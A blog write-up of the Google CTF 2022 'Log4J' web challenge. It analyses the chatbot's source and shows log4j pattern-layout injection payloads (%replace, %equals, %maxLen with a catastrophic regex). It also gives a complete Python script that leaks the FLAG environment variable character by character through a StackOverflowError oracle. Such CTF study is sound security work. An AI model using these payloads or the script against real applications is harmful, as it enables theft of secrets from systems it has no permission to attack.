---
date: 2022-07-09
authors:
  - techbrunch
tags:
  - CTF
categories:
  - web
description: Talk with the most advanced AI.
---

# Google CTF - Log4J

## Introduction

Last weekend I took part in the Google CTF. I chose to look at the web challenges since this is the category I have the
most experience with and I did not have much time. When I discovered the list of challenges LOG4J had the most solved so 
that what I decided to check. 

<!-- more -->

The challenge has the following description:

> Talk with the most advanced AI.

The challenge is available at: https://log4j-web.2022.ctfcompetition.com

The challenge is a simple web app with a title "Chatbot" and an input field. Let's do some simple tests:

| Input | Output                                                             |
|-------|--------------------------------------------------------------------|
| test  | The command should start with a /.                                 |
| /test | Sorry, you must be a premium member in order to run this command.  |

## Analyzing the source

It would help if we knew what is expected from the user. What I really like about the Google CTF is that they often provide the sources. At the time of the CTF the sources where 
downloadable as a [.zip attachment](https://storage.googleapis.com/gctf-2022-attachments-project/c96fc4db126004d01373a9041744f0cb54bcbe6a93f817df022157b0f76a71ac8a6f8e4880aeb3fef2952ec721bcd842233816873a1a5bcc5d2285f9c4c34ba2), but now you can get the sources on GitHub in the [google-ctf repo](https://github.com/google/google-ctf/tree/master/2022/web-log4j).

```python
@app.route("/", methods=['GET', 'POST'])
def start():
    if request.method == 'POST':
        text = request.form['text'].split(' ')
        cmd = ''
        if len(text) < 1:
            return ('invalid message', 400)
        elif len(text) < 2:
            cmd = text[0]
            text = ''
        else:
            cmd, text = text[0], ' '.join(text[1:])
        result = chat(cmd, text)
        return result
    return render_template('index.html')

def chat(cmd, text):
    # run java jar with a 10 second timeout
    res = subprocess.run(['java', '-jar', '-Dcmd=' + cmd, 'chatbot/target/app-1.0-SNAPSHOT.jar', '--', text], capture_output=True, timeout=10)
    print(res.stderr.decode('utf8'))
    return res.stdout.decode('utf-8')
```

```java
public class App {
  public static Logger LOGGER = LogManager.getLogger(App.class);
  public static void main(String[]args) {
    String flag = System.getenv("FLAG");
    if (flag == null || !flag.startsWith("CTF")) {
        LOGGER.error("{}", "Contact admin");
    }
  
    LOGGER.info("msg: {}", args);
    // TODO: implement bot commands
    String cmd = System.getProperty("cmd");
    if (cmd.equals("help")) {
      doHelp();
      return;
    }
    if (!cmd.startsWith("/")) {
      System.out.println("The command should start with a /.");
      return;
    }
    doCommand(cmd.substring(1), args);
  }

  private static void doCommand(String cmd, String[] args) {
    switch(cmd) {
      case "help":
        doHelp();
        break;
      case "repeat":
        System.out.println(args[1]);
        break;
      case "time":
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/M/d H:m:s");
        System.out.println(dtf.format(LocalDateTime.now()));
        break;
      case "wc":
        if (args[1].isEmpty()) {
          System.out.println(0);
        } else {
          System.out.println(args[1].split(" ").length);
        }
        break;
      default:
        System.out.println("Sorry, you must be a premium member in order to run this command.");
    }
  }
  private static void doHelp() {
    System.out.println("Try some of our free commands below! \nwc\ntime\nrepeat");
  }
}
```

Main observations:

- The flag is set in an environment variable named `FLAG`
- log4j is running the latest version (as seen in pom.xml)
  - JNDI lookups are disabled by default and Log4Shell is not exploitable

## Running the application

First let's run the application locally using Docker

To be able to run it locally I removed everything related to kctf:

```dockerfile
FROM ubuntu:20.04 as chroot

RUN /usr/sbin/useradd --no-create-home -u 1000 user

# install maven
RUN apt-get update && \
    apt-get -y --no-install-recommends install maven python3-pip

# copy server code
COPY server /home/user
COPY start.sh /home/user
RUN chmod 755 /home/user/templates

RUN pip install -r /home/user/requirements.txt

# copy and create jar of chatbot
COPY chatbot /home/user/chatbot
WORKDIR /home/user/chatbot
RUN mvn clean package shade:shade

WORKDIR /home/user/
CMD /bin/bash start.sh
```

```bash
docker build -t log4j .
docker run -p 1337:1337 log4j
```

Since most payloads don't start with `/` the response will have the same size, we can look at responses with a 200 status code
but with a different response size:

| Input                     | Output                                                                                     |
|---------------------------|--------------------------------------------------------------------------------------------|
| /etc/passwd               | Sorry, you must be a premium member in order to run this command.                          |
| test%}wjisg'/"<kz88p      | ERROR Unrecognized format specifier []                                                     |
| test%}wjisg'/"<kz88p      | ERROR Empty conversion specifier starting at position 54 in conversion pattern.            |
| testqj2buvf2bc3}}%25z}}$z | ERROR Unrecognized format specifier [z]                                                    |
| testqj2buvf2bc3}}%25z}}$z | ERROR Unrecognized conversion specifier [z] starting at position 67 in conversion pattern. |

As we saw earlier the basic log4j exploit do not appear to work but when using `${env:HOSTNAME}` we can see the 
environment variable being replaced in the logs:

```
09:39:10.346 ERROR com.google.app.App executing dd595caab2fc - Contact admin
09:39:10.348 INFO  com.google.app.App executing dd595caab2fc - msg: --
```

So we need to find a way to exfiltrate the content of `${env:FLAG}` in blind conditions. When dealing blind injection 
there are a few common technics:

- Triggering conditional responses
- Triggering errors
- Triggering time delays
- Out-of-band (OAST) techniques

We can probably already exclude OAST techniques since this was what the log4Shell vulnerability was using (jndi lookup).

It's time to read about the [Pattern Layout](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout). 
There are a few interesting conversion patterns, mostly the one accepting a pattern as argument:

- date{pattern}
- encode{pattern}{[HTML|XML|JSON|CRLF]}
- equals{pattern}{test}{substitution}
- equalsIgnoreCase{pattern}{test}{substitution}
- highlight{pattern}{style}
- variablesNotEmpty{pattern}
- varsNotEmpty{pattern} 
- replace{pattern}{regex}{substitution}
- notEmpty{pattern}

Some other conversion patterns might be interesting for triggering time delays since the documentation mention that they 
are "expensive operation and may impact performance":

- class{precision}
- file
- location
- method

My initial idea was to use the env lookup inside a conversion pattern and trigger an error that would reveal the flag in an 
error message. I tried with a few conversion pattern but none would reveal the FLAG, so I quickly moved on to other techniques.

Two conversion pattern are particularly interesting, `equals` could be used to trigger conditional responses and `replace` 
for a regular expression denial of service ([ReDoS](https://en.wikipedia.org/wiki/ReDoS)).

I tried a simple ReDoS payload and while this did not introduce a time delay at some point a `StackOverflowError` was triggered 
with the following payload:

```
%replace{<@repeat(4000)>a<@/repeat>}{<@urlencode>(a|aa)+<@/urlencode>}{z}
```

The error:

```
2022-07-11 11:47:25,336 main ERROR An exception occurred processing Appender Console org.apache.logging.log4j.core.appender.AppenderLoggingException: java.lang.StackOverflowError
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:165)
	[TRUNCATED]
Caused by: java.lang.StackOverflowError
	at java.base/java.util.regex.Pattern$BmpCharProperty.match(Pattern.java:3963)
```

With this we have the basics for our exploit except for one thing, we need to be able to test each character of the flag
individually. For this we will use the `maxLength` conversion pattern which truncates the result.

```
%replace{
  %equals{
    %maxLen{${env:FLAG}}{3}
  }{CTF}
  {<@repeat(9999)>a<@/repeat>}
}
{<@urlencode>(a|aa)+<@/urlencode>}
{x}
```

If the flag starts with `CTF` we get a `StackOverflowError` error. Using this payload we can iterate over each character. 
There were a couple of hiccups though: 

- I did not find the proper way (if any ?) to test for special characters such as 
`{` and `}` which are part of the flag. I ended up using `replace` again with the meta sequence `\W` to replace all non-word
characters.
- My solution stopped working at 20 characters. Turns out I needed to read the documentation more carefully: "If the 
 length is greater than 20, then the output will contain a trailing ellipsis"

The dirty script to get the FLAG:

```python
import requests

url = "https://log4j-web.2022.ctfcompetition.com:443/"
headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}

flag = ''

for x in range(1, 50):
    print(x)
    for c in 'CTF-abcdef01234567890':
        to_test = (c + "...") if x > 20 else c
        payload = "%replace{%equals{%maxLen{%replace{${env:FLAG}}{\W}{-}}{"+str(x)+"}}{"+flag + to_test +"}{"+"a"*9999+"}}{(a|aa)+}{substitution}"
        data = {
            "text": payload
        }
        resp = requests.post(url, headers=headers, data=data)
        if "StackOverflowError" in resp.text:
            flag = flag+c
            print(flag)
            break
```

The same script can be used to solve LOG4J2 by replacing the matching string since exception were replaced by `Sensitive information detected in output. Censored for security reasons.`.

For alternative solutions, I recommend reading the writeups from [Mario Kahlhofer](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) and 
[Intrigus' Security Lab](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/).